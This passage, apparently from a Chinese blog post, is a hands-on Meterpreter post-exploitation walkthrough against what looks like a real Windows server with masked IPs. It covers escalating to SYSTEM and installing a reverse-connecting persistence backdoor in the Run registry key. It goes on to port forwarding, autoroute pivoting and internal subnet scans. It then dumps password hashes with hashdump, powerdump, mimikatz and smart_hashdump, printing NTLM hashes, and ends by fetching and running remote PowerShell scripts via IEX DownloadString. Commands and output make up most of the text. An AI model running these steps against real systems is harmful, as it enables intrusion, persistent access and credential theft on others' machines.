[*] Sending stage (179267 bytes) to *.*.*.*
[*] Meterpreter session 6 opened (192.168.3.13:1131 -&amp;gt; *.*.*.*:54085) at 2017-12-27 13:51:41 +0800
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;权限维持&quot;&gt;权限维持&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 6
[*] Starting interaction with 6...
meterpreter &amp;gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &amp;gt; run persistence -X -i 50 -p 1132 -r [我的公网IP] 

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /Users/liyingzhe/.msf4/logs/persistence/ZXKF3_20171227.1214/ZXKF3_20171227.1214.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=1132
[*] Persistent agent script is 99700 bytes long
[+] Persistent Script written to C:\Users\ALLEN~1.ZXK\AppData\Local\Temp\iyWfiOpMC.vbs
[*] Executing script C:\Users\ALLEN~1.ZXK\AppData\Local\Temp\iyWfiOpMC.vbs
[+] Agent executed with PID 5204
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x03-关于权限维持的思考&quot;&gt;0x03 关于权限维持的思考&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;persistence 模块&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; info post/windows/manage/persistence_exe

       Name: Windows Manage Persistent EXE Payload Installer
     Module: post/windows/manage/persistence_exe
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Merlyn drforbin Cousins &amp;lt;drforbin6@gmail.com&amp;gt;

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  REXENAME  default.exe      yes       The name to call exe on remote system
  REXEPATH                   yes       The remote executable to use.
  SESSION                    yes       The session to run this module on.
  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

Description:
  This Module will upload an executable to a remote host and make it 
  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
  will start on user login, SYSTEM will start on system boot but 
  requires privs. SERVICE will create a new service which will start 
  the payload. Again requires privs.



Module options (post/windows/manage/persistence_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   REXENAME  default.exe      yes       The name to call exe on remote system
   REXEPATH                   yes       The remote executable to use.
   SESSION                    yes       The session to run this module on.
   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;优先介绍这个模块 &lt;code class=&quot;highlighter-rouge&quot;&gt;post/windows/manage/persistence_exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;它用于创建一个反向连接的后门，使被控端主动连接控制端，传统又好用，但是会留下文件&lt;/p&gt;

&lt;p&gt;参数介绍：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

    -A        自启动一个匹配的handler会话来连接
    -L &amp;lt;opt&amp;gt;  连接目标
    -P &amp;lt;opt&amp;gt;  指定payload ，默认是 windows/meterpreter/reverse_tcp.
    -S        在启动时作为服务自动启动代理（具有SYSTEM权限）
    -T &amp;lt;opt&amp;gt;  使用模板
    -U        用户登录时自动启动代理
    -X        系统引导时自动启动代理
    -h        帮助菜单
    -i &amp;lt;opt&amp;gt;  间隔多少秒像控制端发送连接
    -p &amp;lt;opt&amp;gt;  被控端要连接的端口
    -r &amp;lt;opt&amp;gt;  被控端要连接的IP地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;metsvc&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run metsvc -h

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]

OPTIONS:

    -A        自动启动一个匹配 exploit/multi/handler来连接服务
    -h        帮助菜单
    -r        卸载服务

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;它是一个正向的连接，不适用于复杂的内网环境&lt;/p&gt;

&lt;h2 id=&quot;0x04-端口转发之portfwd详解&quot;&gt;0x04 端口转发之portfwd详解&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Broadcom NetXtreme Gigabit Ethernet
Hardware MAC : c8:1f:66:f2:a9:6b
MTU          : 1500
IPv4 Address : 10.159.63.178
IPv4 Netmask : 255.255.255.128
IPv6 Address : fe80::4d1c:361b:b5e7:5894
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a9f:3fb2
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : Broadcom NetXtreme Gigabit Ethernet #2
Hardware MAC : c8:1f:66:f2:a9:6c
MTU          : 1500
IPv4 Address : 169.254.191.36
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::b805:65eb:7c4d:bf24
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 14
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a9fe:bf24
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 15
============
Name         : Broadcom NetXtreme Gigabit Ethernet #3
Hardware MAC : c8:1f:66:f2:a9:6d
MTU          : 1500
IPv4 Address : 169.254.112.31
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::1d1d:79:e7f1:701f
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 16
============
Name         : Microsoft ISATAP Adapter #3
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a9fe:701f
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 17
============
Name         : Broadcom NetXtreme Gigabit Ethernet #4
Hardware MAC : c8:1f:66:f2:a9:6e
MTU          : 1500
IPv4 Address : 10.159.191.178
IPv4 Netmask : 255.255.255.128
IPv4 Address : ***.***.***.***
IPv4 Netmask : 255.255.255.255
IPv6 Address : fe80::35ec:8852:7f1f:321d
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 18
============
Name         : Microsoft ISATAP Adapter #4
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a9f:bfb2
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fe80::200:5efe:7b67:7168
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 21
============
Name         : Microsoft 6to4 Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : 2002:7b67:7168::7b67:7168
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; netstat -anpt

Connection list
===============

    Proto  Local address                  Remote address       State        User  Inode  PID/Program name
    -----  -------------                  --------------       -----        ----  -----  ----------------
    tcp    169.254.191.36:139             0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:135                    0.0.0.0:*            LISTEN       0     0      12/svchost.exe
    tcp    0.0.0.0:445                    0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:3306                   0.0.0.0:*            LISTEN       0     0      1740/mysqld.exe
    tcp    0.0.0.0:3389                   0.0.0.0:*            LISTEN       0     0      3740/svchost.exe
    tcp    0.0.0.0:47001                  0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:49152                  0.0.0.0:*            LISTEN       0     0      828/wininit.exe
    tcp    0.0.0.0:49153                  0.0.0.0:*            LISTEN       0     0      1052/svchost.exe
    tcp    0.0.0.0:49154                  0.0.0.0:*            LISTEN       0     0      1108/svchost.exe
    tcp    0.0.0.0:21                     0.0.0.0:*            LISTEN       0     0      1692/svchost.exe
    tcp    0.0.0.0:49160                  0.0.0.0:*            LISTEN       0     0      932/lsass.exe
    tcp    0.0.0.0:49161                  0.0.0.0:*            LISTEN       0     0      924/services.exe
    tcp    10.159.63.178:139              0.0.0.0:*            LISTEN       0     0      4/System
    tcp    10.159.191.178:139             0.0.0.0:*            LISTEN       0     0      4/System
    tcp    10.159.191.178:58359           *.*.*.*:1131   ESTABLISHED  0     0      5576/1.exe
    tcp    10.159.191.178:58362           *.*.*.*:1131   ESTABLISHED  0     0      4700/1.exe
    tcp    10.159.191.178:58590           *.*.*.*:4961  SYN_SENT     0     0      2472/Ijkptue.exe
    tcp    169.254.112.31:139             0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:80                     0.0.0.0:*            LISTEN       0     0      1584/httpd.exe
    tcp6   :::49160                       :::*                 LISTEN       0     0      932/lsass.exe
    tcp6   :::21                          :::*                 LISTEN       0     0      1692/svchost.exe
    tcp6   :::80                          :::*                 LISTEN       0     0      1584/httpd.exe
    tcp6   :::135                         :::*                 LISTEN       0     0      12/svchost.exe
    tcp6   :::445                         :::*                 LISTEN       0     0      4/System
    tcp6   :::3389                        :::*                 LISTEN       0     0      3740/svchost.exe
    tcp6   :::47001                       :::*                 LISTEN       0     0      4/System
    tcp6   :::49152                       :::*                 LISTEN       0     0      828/wininit.exe
    tcp6   :::49153                       :::*                 LISTEN       0     0      1052/svchost.exe
    tcp6   :::49154                       :::*                 LISTEN       0     0      1108/svchost.exe
    tcp6   :::49161                       :::*                 LISTEN       0     0      924/services.exe
    udp    0.0.0.0:500                    0.0.0.0:*                         0     0      1108/svchost.exe
    udp    0.0.0.0:4500                   0.0.0.0:*                         0     0      1108/svchost.exe
    udp    0.0.0.0:5355                   0.0.0.0:*                         0     0      1248/svchost.exe
    udp    10.159.63.178:137              0.0.0.0:*                         0     0      4/System
    udp    10.159.63.178:138              0.0.0.0:*                         0     0      4/System
    udp    10.159.191.178:137             0.0.0.0:*                         0     0      4/System
    udp    10.159.191.178:138             0.0.0.0:*                         0     0      4/System
    udp    169.254.112.31:137             0.0.0.0:*                         0     0      4/System
    udp    169.254.112.31:138             0.0.0.0:*                         0     0      4/System
    udp    169.254.191.36:137             0.0.0.0:*                         0     0      4/System
    udp    169.254.191.36:138             0.0.0.0:*                         0     0      4/System
    udp6   :::500                         :::*                              0     0      1108/svchost.exe
    udp6   :::4500                        :::*                              0     0      1108/svchost.exe
    udp6   :::5355                        :::*                              0     0      1248/svchost.exe
    udp6   fe80::1d1d:79:e7f1:701f:546    :::*                              0     0      1052/svchost.exe
    udp6   fe80::35ec:8852:7f1f:321d:546  :::*                              0     0      1052/svchost.exe
    udp6   fe80::4d1c:361b:b5e7:5894:546  :::*                              0     0      1052/svchost.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看出服务器开启了3389，假设我如果需要连接3389该怎么办呢？ -  (刚才提到了，有防火墙的限制)&lt;/p&gt;

&lt;h3 id=&quot;使用portfwd&quot;&gt;使用portfwd&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L &amp;lt;opt&amp;gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址
    -R        表示正向反向端口
    -h        帮助信息
    -i &amp;lt;opt&amp;gt;  端口转发条目的索引与交互（请参阅“列表”命令）
    -l &amp;lt;opt&amp;gt;  转发：本地端口收听  反向：本地端口连接
    -p &amp;lt;opt&amp;gt;  转发：远程端口连接  反向：远程端口监听
    -r &amp;lt;opt&amp;gt;  转发：连接到远程主机
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;下面来练习一下（正向转发）&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目的：将内网某台主机的3389转发到本地&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -L 0.0.0.0 -l 1144 -p 3389 -r 10.159.63.178
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时连接本机的1144就相当于连接10.159.63.178&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目的：将内网某台主机端口流量转发到某台外网主机 (可做端口劫持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -R -l 8080 -p 1478 -L 10.159.191.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时访问10.159.63.178的1478端口就相当于访问10.159.191.2的8080端口&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd delete -i 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;删除条目为1的端口转发&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;列出端口转发条目&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd flush
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;清空所有转发&lt;/p&gt;

&lt;h3 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;添加路由表:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run autoroute -s 10.159.0.0 255.255.128.0
meterpreter &amp;gt; run autoroute -s 10.159.128.0 255.255.128.0
meterpreter &amp;gt; run autoroute -s 10.159.63.0 255.255.255.128
meterpreter &amp;gt; run autoroute -s 10.159.191.0 255.255.255.128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当然在上线前，你就设置好自动添加路由，就不需要去手动添加了：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf auxiliary(tcp) &amp;gt; load auto_add_route
msf auxiliary(tcp) &amp;gt; 
[*] Sending stage (179267 bytes) to ***.***.***.***
[*] Meterpreter session 9 opened (192.168.3.14:1131 -&amp;gt; ***.***.***.***:60372) at 2018-01-02 15:22:20 +0800
[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
[*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
[*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
[-] The 'stdapi' extension has already been loaded.
msf auxiliary(tcp) &amp;gt; sessions -i 9 
[*] Starting interaction with 9...

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是它也有弊端，就是子网太大了，可能会将我们的数据包广播出去，所以最好记一下子网大小，手动灵活添加路由~&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;扫描&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use auxiliary/scanner/portscan/syn
msf auxiliary(syn) &amp;gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
PORTS =&amp;gt; 22-25,80-85,1433,3306,3389,445,135,139
msf auxiliary(syn) &amp;gt; set RHOSTS 10.159.191.1-254
RHOSTS =&amp;gt; 10.159.191.1-254
msf auxiliary(syn) &amp;gt; run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/portscan/tcp 
msf auxiliary(tcp) &amp;gt; show options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf auxiliary(tcp) &amp;gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
PORTS =&amp;gt; 22-25,80-85,1433,3306,3389,445,135,139
msf auxiliary(tcp) &amp;gt; set RHOSTS 10.159.191.1-254
RHOSTS =&amp;gt; 10.159.191.1-254
msf auxiliary(tcp) &amp;gt; set THREADS 3
THREADS =&amp;gt; 3
msf auxiliary(tcp) &amp;gt; run
[+] 10.159.191.1:         - 10.159.191.1:22 - TCP OPEN
[+] 10.159.191.2:         - 10.159.191.2:8080 - TCP OPEN
[+] 10.159.191.5:         - 10.159.191.5:22 - TCP OPEN
[+] 10.159.191.5:         - 10.159.191.5:8080 - TCP OPEN
[+] 10.159.191.7:         - 10.159.191.7:22 - TCP OPEN
[+] 10.159.191.8:         - 10.159.191.8:22 - TCP OPEN
[+] 10.159.191.7:         - 10.159.191.7:8080 - TCP OPEN
[+] 10.159.191.8:         - 10.159.191.8:8080 - TCP OPEN
[+] 10.159.191.6:         - 10.159.191.6:8080 - TCP OPEN
[+] 10.159.191.10:        - 10.159.191.10:22 - TCP OPEN
[+] 10.159.191.11:        - 10.159.191.11:22 - TCP OPEN
[+] 10.159.191.9:         - 10.159.191.9:22 - TCP OPEN
[+] 10.159.191.11:        - 10.159.191.11:8080 - TCP OPEN
[+] 10.159.191.9:         - 10.159.191.9:8080 - TCP OPEN
[+] 10.159.191.10:        - 10.159.191.10:8080 - TCP OPEN
[+] 10.159.191.12:        - 10.159.191.12:22 - TCP OPEN
[+] 10.159.191.12:        - 10.159.191.12:8080 - TCP OPEN
[+] 10.159.191.15:        - 10.159.191.15:22 - TCP OPEN
[+] 10.159.191.15:        - 10.159.191.15:8080 - TCP OPEN
[+] 10.159.191.13:        - 10.159.191.13:8080 - TCP OPEN
[+] 10.159.191.18:        - 10.159.191.18:8080 - TCP OPEN
[+] 10.159.191.17:        - 10.159.191.17:8080 - TCP OPEN
[+] 10.159.191.19:        - 10.159.191.19:22 - TCP OPEN
[+] 10.159.191.19:        - 10.159.191.19:8080 - TCP OPEN
[+] 10.159.191.26:        - 10.159.191.26:22 - TCP OPEN
[+] 10.159.191.26:        - 10.159.191.26:3306 - TCP OPEN
[*] Scanned  26 of 254 hosts (10% complete)
[+] 10.159.191.35:        - 10.159.191.35:22 - TCP OPEN
[+] 10.159.191.36:        - 10.159.191.36:22 - TCP OPEN
[+] 10.159.191.39:        - 10.159.191.39:22 - TCP OPEN
[+] 10.159.191.39:        - 10.159.191.39:3306 - TCP OPEN
[+] 10.159.191.50:        - 10.159.191.50:22 - TCP OPEN
[+] 10.159.191.51:        - 10.159.191.51:22 - TCP OPEN
[+] 10.159.191.50:        - 10.159.191.50:3306 - TCP OPEN
******

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-meterpreter&quot;&gt;0x05 Meterpreter&lt;/h2&gt;

&lt;h3 id=&quot;获取hash的几个方式&quot;&gt;获取Hash的几个方式&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;run hashdump&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run hashdump 

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 699b2df6ee97132bcad5b2f9efdc738e...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b4***b51404ee:a4b09576473b6a35e456ed407a98e334:::
Guest:501:aad3b435b5140***404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ftpuser:1000:aad3b435b51****ee:2280c4ddb554cdcdc62c72c291f2810a:::
patrol:1002:aad3b435b51****78ab2d769fda7de045a3622a62ea:::
neuadmin:1005:aad3b435***404ee:345b3b0faf52aea5200da1cf8d1323a0:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;run powerdump&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run powerdump 
[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 53805.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...
??Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ftpuser:1000:aad3b435b51404eeaad3b435b51404ee:2280c4ddb554cdcdc62c72c291f2810a:::
patrol:1002:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
neuadmin:1005:aad3b435b51404eeaad3b435b51404ee:345b3b0faf52aea5200da1cf8d1323a0:::
allen:1007:aad3b435b51404eeaad3b435b51404ee:53a6281e41664275dfbccd4d171e406f:::
[*] Setting Execution policy back to Restricted...
[*] Cleaning up after ourselves...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;load mimikatz
kerberos&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load mimikatz 
Loading extension mimikatz...
[!] Loaded x86 Mimikatz on an x64 architecture.
Success.
meterpreter &amp;gt; kerberos 
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID      Package    Domain        User           Password
------      -------    ------        ----           --------
******      *******    ******        ****           ********
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;run post/windows/gather/smart_hashdump&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/smart_hashdump

[*] Running module against ZXKF3
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /Users/liyingzhe/.msf4/loot/20171228143129_default_10.159.191.178_windows.hashes_440460.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY 699b2df6ee97132bcad5b2f9efdc738e...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[*] 	No users with password hints on this system
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4b09576473b6a35e456ed407a98e334:::
[+] 	ftpuser:1000:aad3b435b51404eeaad3b435b51404ee:2280c4ddb554cdcdc62c72c291f2810a:::
[+] 	patrol:1002:aad3b435b51404eeaad3b435b51404ee:ce7878ab2d769fda7de045a3622a62ea:::
[+] 	neuadmin:1005:aad3b435b51404eeaad3b435b51404ee:345b3b0faf52aea5200da1cf8d1323a0:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x06-powershell技巧&quot;&gt;0x06 PowerShell技巧&lt;/h2&gt;

&lt;h3 id=&quot;外部powershell脚本&quot;&gt;外部Powershell脚本&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Powersploit https://github.com/PowerShellMafia/PowerSploit&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;第一种办法（推荐）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load powershell 
Loading extension powershell...Success.
meterpreter &amp;gt; powershell_shell
PS &amp;gt; whoami
nt authority\system
PS &amp;gt; IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&quot;);
PS &amp;gt; Invoke-Portscan -Hosts 10.159.63.2 -Ports &quot;21&quot;


Hostname      : 10.159.63.2
alive         : True
openPorts     : {21}
closedPorts   : {}
filteredPorts : {}
finishTime    : 2017/12/28 17:19:46

.....

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二种办法：(先通过其他模块下载)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/manage/download_exec URL=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1

[*] 41534 bytes downloaded to C:\Windows\TEMP\Invoke-Portscan.ps1 in 1 seconds 
meterpreter &amp;gt; powershell_shell 
PS &amp;gt; C:\Windows\TEMP\Invoke-Portscan.ps1
